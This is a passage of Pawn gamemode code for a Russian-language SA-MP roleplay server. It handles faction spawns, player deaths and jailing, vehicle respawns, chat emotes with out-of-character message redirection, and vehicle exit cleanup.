		    SetPVarInt(playerid,"Hospital",0);
		    return true;
		}
		else if(PlayerInfo[playerid][pMember] == F_VAGOS && GetPVarInt(playerid,"Hospital") == 0)
		{
			t_SetPlayerPos(playerid,2799.4390,-1620.4969,14.5990);
			SetPlayerFacingAngle(playerid, 301.3435);
			SetPlayerInterior(playerid, 0);
		    SetPlayerVirtualWorld(playerid, 0);
		    SetPVarInt(playerid,"Hospital",0);
		    return true;
		}
		if(PlayerInfo[playerid][pMember] == F_ARMY)
		{
			SetPlayerPos(playerid,247.8784,1859.4562,14.0840);
			SetPlayerFacingAngle(playerid, 90.2);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_CASINO)
		{
			SetPlayerPos(playerid,2146.5649,1609.5853,1006.1797);
			SetPlayerFacingAngle(playerid,278.8867);
			SetPlayerInterior(playerid, 1);
			SetPlayerVirtualWorld(playerid, 0);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_LCN)
		{
			SetPlayerPos(playerid,2541.0574,-1295.1235,1054.6406);
			SetPlayerFacingAngle(playerid, 92.2);
			SetPlayerInterior(playerid, 2);
			SetPlayerVirtualWorld(playerid, 2);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_YAKUZA)
		{
			SetPlayerPos(playerid,1265.7104,-793.7453,1084.0078);
			SetPlayerFacingAngle(playerid,268.5670);
			SetPlayerInterior(playerid, 5);
			SetPlayerVirtualWorld(playerid, 1);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_RM)
		{
			SetPlayerPos(playerid,2558.9172,-1296.3939,1060.9844);
			SetPlayerFacingAngle(playerid, 272.3);
			SetPlayerInterior(playerid, 2);
			SetPlayerVirtualWorld(playerid, 1);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS)
		{
			SetPlayerPos(playerid,2171.5288,1602.0793,999.9686);
			SetPlayerFacingAngle(playerid, 87.7);
			SetPlayerInterior(playerid, 1);
			SetPlayerVirtualWorld(playerid, 1);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_REDDRAGON)
		{
			SetPlayerPos(playerid,1118.3370,-9.9800,1002.0859);
			SetPlayerFacingAngle(playerid, 330.1814);
			SetPlayerInterior(playerid, 12);
			SetPlayerVirtualWorld(playerid, 0);
			return true;
		}
	}
	PreloadAllAnims(playerid);
	PlayerSpawned[playerid] = 1;
	return true;
}
public OnPlayerDeath(playerid, killerid, reason)
{
	if(PlayerLogged[playerid] == 0) return false;
	PlayerSpawned[playerid] = 0;
	SetPVarInt(playerid,"K_Times",GetPVarInt(playerid,"K_Times") + 1);
	if(reason == 38 && GetPlayerState(killerid) == PLAYER_STATE_PASSENGER)
	{
		KickEx(playerid,8881);
		return true;
	}
	if(GetPVarInt(playerid,"K_Times") > 1)
	{
		KickEx(playerid,5244);
		return true;
	}
	if(GetPVarInt(playerid,"pGPSWork") == 1)
	{
    	DisablePlayerRaceCheckpoint(playerid);
	}
	if(reason >= 1 && reason <= 46 && GetPlayerWeapon(killerid) != reason && PlayerInfo[playerid][pLevel] <= 3)
	{
		KickEx(playerid,5255);
		return true;
	}
	Mission[playerid] = 0;
	new bandkiller,bandkill;
	if(PlayerInfo[killerid][pLeader] !=0)
	{
		bandkiller = PlayerInfo[killerid][pLeader];
	}
	else
	{
		bandkiller = PlayerInfo[killerid][pMember];
	}
	if(PlayerInfo[playerid][pLeader] !=0)
	{
		bandkill = PlayerInfo[playerid][pLeader];
	}
	else
	{
		bandkill = PlayerInfo[playerid][pMember];
	}
	if(bandkiller != bandkill)
	{
		if(GangInfo[bandkiller][capture] && GangInfo[bandkill][capture] == 1)
		{
			if(GangInfo[bandkiller][captureid] == GangInfo[bandkill][captureid])
			{
				GangInfo[bandkiller][score] = GangInfo[bandkiller][score]+1;
				CaptureUpd(bandkiller);
			}
		}
	}
	if(IsAArmy(killerid))
	{
		if(IsAGang(playerid))//ПРОВЕРИТЬ!!!
		{
			if(PlayerToPoint(250.0, killerid, 204.4098,1912.7648,17.6406))
			{
				if(PlayerToPoint(250.0, playerid, 204.4098,1912.7648,17.6406))
				{
					PlayerInfo[killerid][pPayCheck] += 150;
				}
			}
		}
		return 1;
	}
	Mission[playerid] = 0;
	new gunname[32],string[128];
	ResetWeapon(playerid);
	if(PlayerInfo[playerid][pJob] == J_TRUCKER) ResetTruck(playerid);
	PlayerPlaySound(playerid, 30803, 0.0, 0.0, 0.0);
	if(PlayerInfo[playerid][pHealthS] >= 9)
	{
		PlayerInfo[playerid][pHealthS] -= 4.00;
		PlayerInfo[playerid][pHeal] = PlayerInfo[playerid][pHealthS];
	}
	else
	{
		PlayerInfo[playerid][pHealthS] = 10;
		PlayerInfo[playerid][pHeal] = PlayerInfo[playerid][pHealthS];
		SendClientMessage(playerid,COLOR_YELLOW,"Ваше состояние здоровья на грани!");
	}
	PlayerInfo[playerid][pHospital] = 1;
	GunCheckTime[playerid] = 5;
	GetWeaponName(reason,gunname,sizeof(gunname));
	CasinoDuty[playerid] = 0;
	if(strlen(gunname) > 1 && killerid != 65535) format(string, 128,"[A] %s (ID: %d) убил игрока %s (ID: %d) с %s",PlayerInfo[killerid][pSendername],killerid,PlayerInfo[playerid][pSendername],playerid,gunname);
	else if(killerid != INVALID_PLAYER_ID && strlen(gunname) < 1) format(string, 128, "[A] %s (ID: %d) убил игрока %s (ID: %d) кулаками",PlayerInfo[killerid][pSendername],killerid,PlayerInfo[playerid][pSendername],playerid);
	else if(killerid == INVALID_PLAYER_ID || killerid == 65535) format(string, 128, "[A] %s (ID: %d) погиб",PlayerInfo[playerid][pSendername], playerid);
	SendAdminMessage(COLOR_LIGHTRED,string);
	printf("Игрок %s только что умер", PlayerInfo[playerid][pSendername]);
	DisablePlayerCheckpoint(playerid);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid,3);
	if(GetPVarInt(playerid, "ProductID") > 0)
	{
		DisablePlayerRaceCheckpoint(playerid);
		Delete3DTextLabel(ProductInfo[GetPVarInt(playerid, "ProductID")][pText3D]);
		ProductInfo[GetPVarInt(playerid, "ProductID")][pStatus] = false;
		DeletePVar(playerid, "ProductID");
	}
	if(GetPVarInt(playerid, "FuelID") > 0)
	{
		DisablePlayerRaceCheckpoint(playerid);
		Delete3DTextLabel(FuelInfo[GetPVarInt(playerid, "FuelID")][pText3D]);
		FuelInfo[GetPVarInt(playerid, "FuelID")][pStatus] = false;
		DeletePVar(playerid, "FuelID");
	}
	if(GetPVarInt(playerid, "Noun") > 0)
	{
		if(GetPVarInt(playerid, "NounObjID") > 0)
		{
			DestroyObject(NounObject[GetPVarInt(playerid, "NounObjID")]);
			if(GetPVarInt(playerid, "NounObjID") < 10) NounObject[GetPVarInt(playerid, "NounObjID")] = CreateObject(3930,560.3654+random(10),840.2457+random(75),-44.00700073,0.00000000,0.00000000,0.00000000);
			else NounObject[GetPVarInt(playerid, "NounObjID")] = CreateObject(3930,615.3654+random(55),815.2457+random(65),-43.6009,0.00000000,0.00000000,0.00000000);
			DeletePVar(playerid, "NounObjID");
		}
		DeletePVar(playerid, "Noun");
		DeletePVar(playerid, "OldMinerSkin");
		DeletePVar(playerid, "MinerKG");
		DeletePVar(playerid, "MinerKG_One");
		DisablePlayerRaceCheckpoint(playerid);
	}
	new caller = Mobile[playerid];
	if(caller != -1)
	{
		SendClientMessage(caller,  COLOR_GRAD2, "Связь оборвалась");
		CellTime[caller] = -1;
		Mobile[caller] = -1;
		Mobile[playerid] = -1;
		CellTime[playerid] = -1;
		DeletePVar(playerid, "CallTime");
		DeletePVar(caller, "CallTime");
	}
	if(InShop[playerid] > 0 || GetPVarInt(playerid, "InShop") > 0)
	{
		DestroyVehicle(veh[playerid]);
		DeletePVar(playerid, "InShop");
		InShop[playerid] = 0;
		TextDrawHideForPlayer(playerid,VehNazv[playerid]);
		TextDrawHideForPlayer(playerid,VehCost[playerid]);
		TextDrawHideForPlayer(playerid,PressA);
		TextDrawHideForPlayer(playerid,PressD);
		TextDrawHideForPlayer(playerid,PressH);
		TextDrawHideForPlayer(playerid,PressC);
		TextDrawHideForPlayer(playerid,PressB);
		TextDrawHideForPlayer(playerid,VehBox);
	}
	if(GetPVarInt(playerid, "LicTest") > 0)
	{
		DeletePVar(playerid, "LicTest");
		DeletePVar(playerid, "LicTestHealth");
		DeletePVar(playerid, "LicTestError");
		SendClientMessage(playerid, COLOR_LIGHTRED, "Вы провалили экзамен по вождению");
	}
	if(PlayerInfo[killerid][pJail] == 0)
	{
		if(IsACop(killerid) || PlayerInfo[killerid][pMember] == F_ARMY || IsAGang(killerid) || IsAMafia(killerid)) { }
		else
		{
			if(PlayerInfo[killerid][pWanted] >= 6) return true;
			PlayerInfo[killerid][pWanted] += 2;
			if(PlayerInfo[killerid][pWanted] >= 6) PlayerInfo[killerid][pWanted] = 6;
			PlayerInfo[killerid][pWantedTime] = 1800 + random(300);
			SetPlayerWantedLevel(killerid,PlayerInfo[killerid][pWanted]);
			SetPlayerCriminal(killerid, "Неизвестный", "Убийство человека");
			//SendMes(killerid,-1,"погиб %s",PlayerInfo[playerid][pSendername]);
		}
	}
	if(GetPlayerState(killerid) == 2)
	{
		SendClientMessage(killerid, COLOR_LIGHTRED, "Вы нарушили правило сервера №2.4 (DB)!");
		SendClientMessage(killerid, COLOR_WHITE, "Соблюдайте правила сервера, чтобы избежать кика");
		format(string, 128, "[A] %s (ID: %i) был кикнут за убийство с вод. места", PlayerInfo[killerid][pSendername], killerid);
		SendAdminMessage(COLOR_LIGHTRED, string);
		GKick(killerid);
	}
	if(MatsFactTime[playerid] > 0) MatsFactTime[playerid] = 0;
	if(Ether[playerid] == true)
	{
		new CB[16];
		Ether[playerid] = false;
		Convert(GetPVarInt(playerid,"InEther"),CB);
		if(EtherSms[PlayerInfo[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием СМС",PlayerInfo[playerid][pSendername]); SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string); }
		if(EtherCall[PlayerInfo[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием звонков",PlayerInfo[playerid][pSendername]); SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string); }
		format(string, 90, "[F] %s вышел(а) из прямого эфира (Время в эфире: %s, звонков: %i, СМС: %i)",PlayerInfo[playerid][pSendername], CB, CallNews[PlayerInfo[playerid][pNews]-1],SmsNews[PlayerInfo[playerid][pNews]-1]);
		SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
		EtherSms[PlayerInfo[playerid][pNews]-1] = false;
		EtherCall[PlayerInfo[playerid][pNews]-1] = false;
		SmsNews[PlayerInfo[playerid][pNews]-1] = 0;
		CallNews[PlayerInfo[playerid][pNews]-1] = 0;
		DeletePVar(playerid, "InEther");
		if(Mobile[playerid] != -1) MobileCrash(playerid);
	}
	if(EtherLive[playerid] == true)
	{
		EtherLive[playerid] = false;
		DeletePVar(playerid, "Etherfrac");
		SendClientMessage(playerid, COLOR_LIGHTRED, "Вы вышли из прямого эфира");
	}
	if(PlayerInfo[playerid][pWanted] > 0)
	{
		new Float:pos[3], full_;
		GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		foreach(new i:Player)
		{
			if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
			if(IsACop(i))
			{
				if(IsPlayerInRangeOfPoint(i, 100.0, pos[0], pos[1], pos[2]))
				{
					full_ = PlayerInfo[i][pMember];
					break;
				}
			}
		}
		if(full_ > 0)
		{
			if(full_ == F_POLICE_LS)
			{
				PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pWanted] * 600;
				SetPlayerColor(playerid, 0xFFFFFF00);
				SendMes(playerid, COLOR_LIGHTRED, "Вы посажены в камеру LSPD на %i секунд",PlayerInfo[playerid][pWanted]*600);
				SetPlayerInterior(playerid, 6);
				PlayerInfo[playerid][pWanted] = 0;
				SetPlayerPos(playerid,264.1425,77.4712,1001.0391);
				SetPlayerFacingAngle(playerid, 263.0160);
				PlayerInfo[playerid][pJail] = 1;
				SetPlayerWantedLevel(playerid, 0);
				TogglePlayerControllable(playerid, 1);
				format(string, 80, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%s", PlayerInfo[playerid][pJailTime]-10);
				GameTextForPlayer(playerid, string, 1000, 3);
			}
			if(full_ == F_POLICE_SF)
			{
				PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pWanted] * 600;
				SetPlayerColor(playerid, 0xFFFFFF00);
				SendMes(playerid, COLOR_LIGHTRED, "Вы посажены в камеру SFPD на %i секунд",PlayerInfo[playerid][pWanted]*600);
				SetPlayerInterior(playerid, 10);
				PlayerInfo[playerid][pWanted] = 0;
				SetPlayerPos(playerid,219.5400,109.9767,999.0156);
				SetPlayerFacingAngle(playerid, 1.0);
				PlayerInfo[playerid][pJail] = 2;
				SetPlayerWantedLevel(playerid, 0);
				TogglePlayerControllable(playerid, 1);
				format(string, 80, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%s", PlayerInfo[playerid][pJailTime]-10);
				GameTextForPlayer(playerid, string, 1000, 3);
			}
			if(full_ == F_FBI)
			{
				PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pWanted] * 600;
				SetPlayerColor(playerid, 0xFFFFFF00);
				SendMes(playerid, COLOR_LIGHTRED, "Вы посажены в камеру F.B.I на %i секунд",PlayerInfo[playerid][pWanted]*600);
				SetPlayerInterior(playerid, 3);
				PlayerInfo[playerid][pWanted] = 0;
				SetPlayerPos(playerid,285.7703,286.7446,996.5789);
				SetPlayerFacingAngle(playerid, 0.0000);
				PlayerInfo[playerid][pJail] = 3;
				SetPlayerWantedLevel(playerid, 0);
				TogglePlayerControllable(playerid, 1);
				format(string, 80, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%s", PlayerInfo[playerid][pJailTime]-10);
				GameTextForPlayer(playerid, string, 1000, 3);
			}
		}
	}
	return true;
}
public OnVehicleSpawn(vehicleid)
{
	SetVehicleNumberPlate(vehicleid,""Namemode"");
	if(Robbery[vehicleid] == true)
	{
		Robbery[vehicleid] = false;
		Boot[vehicleid] = false;
		Delete3DTextLabel(MatsText[vehicleid]);
		DestroyPickup(MatsPickup[vehicleid]);
	}
	if(vehiclerun[vehicleid] == 1)
	{
		Delete3DTextLabel(veh3dtext);
		Seeds[vehicleid] = 0;
		DestroyPickup(farmpickup);
		vehiclerun[vehicleid] = 0;
	}
	if(MatsStatus[vehicleid] == true)
	{
		MatsStatus[vehicleid] = false;
		Boot[vehicleid] = false;
		Delete3DTextLabel(MatsText[vehicleid]);
		DestroyPickup(MatsPickup[vehicleid]);
	}
	if(GetVehicleModel(vehicleid) == 462) Fuel[vehicleid] = 999;
	SetVehicleParamsEx(vehicleid,false,false, false,false,false,false,false);
	Engine[vehicleid] = false;
	Lights[vehicleid] = false;
	if(vehicleid >= lastveh)
	{
		foreach(new i:Player)
		{
			if(GetPVarInt(i,"PlayerCar") == vehicleid)
			{
				if(PlayerInfo[i][cVehcoms][0]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][0]);
				if(PlayerInfo[i][cVehcoms][1]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][1]);
				if(PlayerInfo[i][cVehcoms][2]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][2]);
				if(PlayerInfo[i][cVehcoms][3]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][3]);
				if(PlayerInfo[i][cVehcoms][4]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][4]);
				if(PlayerInfo[i][cVehcoms][5]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][5]);
				if(PlayerInfo[i][cVehcoms][6]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][6]);
				if(PlayerInfo[i][cVehcoms][7]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][7]);
				if(PlayerInfo[i][cVehcoms][8]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][8]);
				if(PlayerInfo[i][cVehcoms][9]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][9]);
				if(PlayerInfo[i][cVehcoms][10]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][10]);
				if(PlayerInfo[i][cVehcoms][11]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][11]);
				if(PlayerInfo[i][cVehcoms][12]!=0) AddVehicleComponent(vehicleid, PlayerInfo[i][cVehcoms][12]);
				if(PlayerInfo[i][cVehcoms][13]!=0) AddVehicleComponent(vehicleid,PlayerInfo[i][cVehcoms][13]);
				if(PlayerInfo[i][cPaintjob]!=3) ChangeVehiclePaintjob(vehicleid, PlayerInfo[i][cPaintjob]);
			}
		}
	}
	return true;
}
public OnVehicleDeath(vehicleid, killerid)
{
	SetVehicleNumberPlate(vehicleid,""Namemode"");
	return true;
}
public OnPlayerText(playerid, text[])
{
	if(PlayerLogged[playerid] == 0) return false;
	new string[145];
	if(PlayerInfo[playerid][pMuted] > 0) { SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime); return false; }
	if(MatsFactTime[playerid] > 0 || Product_time[playerid] > 0) { SendClientMessage(playerid, COLOR_GREY, "Ошибка! Действие невозможно!"); return false; }
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) { SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec); return false; }
	if(EtherCalled[playerid] == true && PlayerInfo[Mobile[playerid]][pMember] == F_UNITEDNEWS)
	{
		if(Mobile[Mobile[playerid]] == playerid)
		{
			format(string, 144, "[%s] [Тел.] %s: %s",FracInfo[F_UNITEDNEWS][fName],PlayerInfo[Mobile[playerid]][pSendername], text);
			SendNTodayMes(TEAM_BLUE_COLOR, string);
			SetPVarInt(Mobile[playerid],"AntiFlood",gettime() + THFREE_SECOND_FLOOD);
		}
		format(string, 144, "[Телефон] %s: %s", PlayerInfo[playerid][pSendername], text);
		ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		return false;
	}
	if(Mobile[playerid] != -1 && Ether[playerid] == false)
	{
		format(string, 144, "[Телефон] %s: %s", PlayerInfo[playerid][pSendername], text);
		ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		if(Mobile[Mobile[playerid]] == playerid) SendClientMessage(Mobile[playerid], COLOR_YELLOW,string);
		return false;
	}
	if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS && Ether[playerid] == true)
	{
		format(string, 144, "[%s] %s: %s", FracInfo[PlayerInfo[playerid][pMember]][fName], PlayerInfo[playerid][pSendername], text);
		SendNTodayMes(TEAM_BLUE_COLOR, string);
		SetPVarInt(playerid,"AntiFlood",gettime() + THFREE_SECOND_FLOOD);
		return false;
	}
	if(strcmp(text, "xD", true) == 0 || strcmp(text, "xd", true) == 0 || strcmp(text, ":В", true) == 0 || strcmp(text, ":в", true) == 0 )
	{
		format(string, 32, "%s смеётся", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		return false;
	}
	if(strcmp(text, "здравия", true) == 0)
	{
		format(string, 64, "%s отдал честь", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		return false;
	}
	if(strcmp(text, ";)", true) == 0 || strcmp(text, ";-)", true) == 0)
	{
		format(string, 32, "%s подмигнул", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		return false;
	}
	if(strcmp(text, ":с", true) == 0 || strcmp(text, ":C", true) == 0)
	{
		format(string, 32, "%s огорчен", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		return false;
	}
	if(strcmp(text, "чВ", true) == 0 || strcmp(text, "хД", true) == 0 || strcmp(text, "хд", true) == 0 || strcmp(text, "xDD", true) == 0)
	{
		format(string, 64, "%s валяется от смеха", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		return false;
	}
	if(strcmp(text, ")", true) == 0 || strcmp(text, "))", true) == 0  || strcmp(text, ":)", true) == 0  || strcmp(text, "=)", true) == 0)
	{
		format(string, 64, "%s улыбается", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		return false;
	}
	if(strcmp(text, ":D", true) == 0)
	{
		format(string, 64, "%s хохочет во весь голос", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		return false;
	}
	if(strcmp(text, "(", true) == 0 || strcmp(text, "((", true) == 0 || strcmp(text, ":(", true) == 0  || strcmp(text, "=(", true) == 0)
	{
		format(string, 64, "%s грустит", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		return false;
	}
	if(strcmp(text, ".й", true) == 0)
	{
		format(string, 64, "** (( %s попытался выйти из игры ))", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		return false;
	}
	if(strcmp(text, "ку", true) == 0 || strcmp(text, "привет", true) == 0 || strcmp(text, "здарова", true) == 0)
	{
		if(PlayerInfo[playerid][pMember] == F_GROVE)
		{
			format(string, 64, "%s показал распальцовку 'Grove Street Gang'", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		}
		else if(PlayerInfo[playerid][pMember] == F_BALLAS)
		{
			format(string, 64, "%s показал распальцовку 'The Ballas Gang'", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		}
		else if(PlayerInfo[playerid][pMember] == F_RIFA)
		{
			format(string, 64, "%s показал распальцовку 'The Rifa Gang'", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		}
		else if(PlayerInfo[playerid][pMember] == F_AZTECAS)
		{
			format(string, 64, "%s показал распальцовку 'Varios Los Aztecas Gang'", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		}
		else if(PlayerInfo[playerid][pMember] == F_VAGOS)
		{
			format(string, 64, "%s показал распальцовку 'Los Santos Vagos Gang'", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		}
		return false;
	}
	if(strfind(text,"админ",true) != -1 || strfind(text,"afk",true) != -1 ||  strfind(text,"афк",true) != -1\
			|| strfind(text,"бан",true) != -1 || strfind(text,"сайт",true) != -1  || strfind(text,"серв",true) != -1\
			|| strfind(text,"кик",true) != -1 || strfind(text,"samp",true) != -1 || strfind(text,"gta",true) != -1\
			|| strfind(text,"акк",true) != -1 || strfind(text,"введи",true) != -1 || strfind(text,"/",true) != -1)
	{
		SendClientMessage(playerid,COLOR_ORANGE,"Ваше сообщение было автоматически перенесено в /b чат, просим соблюдать 'Метагейминг'");
		cmd_b(playerid,text);
		return false;
	}
	if(strfind(text,".и",true) != -1)
	{
		SendClientMessage(playerid,COLOR_ORANGE,"Ваше сообщение было автоматически перенесено в /b чат.");
		cmd_b(playerid,text);
		return false;
	}
	if(strfind(text,".ы",true) != -1)
	{
		SendClientMessage(playerid,COLOR_ORANGE,"Мы обнаружили команду /s, и перенесли ее за вас ;)");
		cmd_s(playerid,text);
		return false;
	}
	if(strfind(text,".ыьы",true) != -1)
	{
		SendClientMessage(playerid,COLOR_ORANGE,"Мы обнаружили команду /sms, и перенесли ее за вас ;)");
		cmd_sms(playerid,text);
		return false;
	}
	if(strfind(text,".ьь",true) != -1)
	{
		SendClientMessage(playerid,COLOR_ORANGE,"Возможно вы имеете виду команду '/mm'?");
		cmd_mm(playerid,text);
		return false;
	}
	if(strfind(text,".а",true) != -1)
	{
		SendClientMessage(playerid,COLOR_ORANGE,"Мы обнаружили команду /f, и перенесли ее за вас ;)");
		cmd_s(playerid,text);
		return false;
	}
	if(realchat == true)
	{
		if(PlayerLogged[playerid] == 0) return false;
		if(GetPVarInt(playerid, "TimeDM") != 0)
		{
			format(string, 144, "%s говорит (запыхавшись):{FFFFFF} %s", PlayerInfo[playerid][pSendername], text);
			ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			SetPlayerChatBubble(playerid,text,COLOR_LIGHTGREEN,20.0,10000);
		}
		else
		{
			if(!IsPlayerInAnyVehicle(playerid))
			{
				format(string, 144, "- %s (%s)", text, PlayerInfo[playerid][pSendername]);
				ProxDetector(20.0, playerid, string,COLOR_GRAD5, COLOR_GRAD4, COLOR_GRAD3, COLOR_GRAD2, COLOR_GRAD1);
				SetPlayerChatBubble(playerid,text,COLOR_LIGHTGREEN,20.0,10000);
				ApplyAnimation(playerid,"PED","IDLE_CHAT",8.1,0,1,1,1,1);
				SetTimerEx("ClearAnimText", 1500, false, "d", playerid);
			}
			else
			{
				format(string, 144, "*(Говорит в Т/С) %s (%s)", text, PlayerInfo[playerid][pSendername]);
				ProxDetector(20.0, playerid, string,COLOR_GRAD5, COLOR_GRAD4, COLOR_GRAD3, COLOR_GRAD2, COLOR_GRAD1);
			}
		}
		SetPVarInt(playerid,"AntiFlood",gettime() + THFREE_SECOND_FLOOD);
		return false;
	}
	return true;
}
forward ClearAnimText(playerid);
public ClearAnimText(playerid)
{
	ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,0,0,0,0);
	return true;
}
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	UseEnter[playerid] = true;
	IDVEH[playerid]=vehicleid;
	if(IsPlayerAttachedObjectSlotUsed(playerid, 3) || IsPlayerAttachedObjectSlotUsed(playerid, 2))
	{
		ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,0,0,0,0,0);
		RemovePlayerAttachedObject(playerid,3);
		RemovePlayerAttachedObject(playerid,2);
	}
	GunCheckTime[playerid] = 5;
	return true;
}
public OnPlayerExitVehicle(playerid, vehicleid)
{
	SetPVarInt(playerid,"AFK_Time",0);
	GunCheckTime[playerid] = 5;
	new string[128];
	if(GetPVarInt(playerid,"FarmCombainer") != 0)
	{
		SendClientMessage(playerid,-1,"Вы отменили рассаду на ферме!");
		DeletePVar(playerid,"FarmCombainer");
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(GetPVarInt(playerid, "FuelCarLittle") > 0)
	{
		PlayerInfo[playerid][pPayCheck] += GetPVarInt(playerid, "JobLittlePrice");
		SendMes(playerid, COLOR_BLUE, "Рабочий день завершен. Вами заработано: %i долларов", GetPVarInt(playerid, "JobLittlePrice"));
		SendClientMessage(playerid, COLOR_WHITE, "Деньги будут перечислены на счет во время зарплаты");
		DeletePVar(playerid, "FuelCarLittle");
		DeletePVar(playerid, "LittleFull");
		DeletePVar(playerid, "JobLittlePrice");
		DisablePlayerRaceCheckpoint(playerid);
	}
	ResetCarInfo(playerid);
	if(Ether[playerid] == true)
	{
		new CB[16];
		Ether[playerid] = false;
		Convert(GetPVarInt(playerid,"InEther"),CB);
		if(EtherSms[PlayerInfo[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием СМС",PlayerInfo[playerid][pSendername]); SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string); }
		if(EtherCall[PlayerInfo[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием звонков",PlayerInfo[playerid][pSendername]); SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string); }
		format(string, 90, "[F] %s вышел(а) из прямого эфира (Время в эфире: %s, звонков: %i, СМС: %i)",PlayerInfo[playerid][pSendername], CB, CallNews[PlayerInfo[playerid][pNews]-1],SmsNews[PlayerInfo[playerid][pNews]-1]);
		SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
		EtherSms[PlayerInfo[playerid][pNews]-1] = false;
		EtherCall[PlayerInfo[playerid][pNews]-1] = false;
		SmsNews[PlayerInfo[playerid][pNews]-1] = 0;
		CallNews[PlayerInfo[playerid][pNews]-1] = 0;
		DeletePVar(playerid, "InEther");
		if(Mobile[playerid] != -1) MobileCrash(playerid);
	}
	if(vehicleid >= grarm1car[0] && vehicleid <= grarm1car[1] && Mission[playerid] == 1)
	{
		Mission[playerid] = 0;
		return true;
	}
	if(GetPVarInt(playerid, "PriceTaxi") > 0)
	{
		SendMes(playerid, COLOR_BLUE, "Рабочий день завершен. Вами заработано: %i долларов", GetPVarInt(playerid, "TaxiMoney"));
		SendClientMessage(playerid, COLOR_WHITE, "Деньги будут перечислены на счет во время зарплаты");
		DeletePVar(playerid, "PriceTaxi");
		DeletePVar(playerid, "TaxiMoney");
		Delete3DTextLabel(TaxiText3D[playerid]);
		foreach(new i:Player)
		{
			if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
			if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) != 2)
			{
				DeletePVar(i, "TimeTaxi");
				DeletePVar(i, "TaxiPrice");
				DeletePVar(i, "PlayerTaxi");
			}
		}
	}
	if(GetPVarInt(playerid, "TaxiPrice") > 0)
	{
		DeletePVar(playerid, "TimeTaxi");
		DeletePVar(playerid, "TaxiPrice");
		DeletePVar(playerid, "PlayerTaxi");
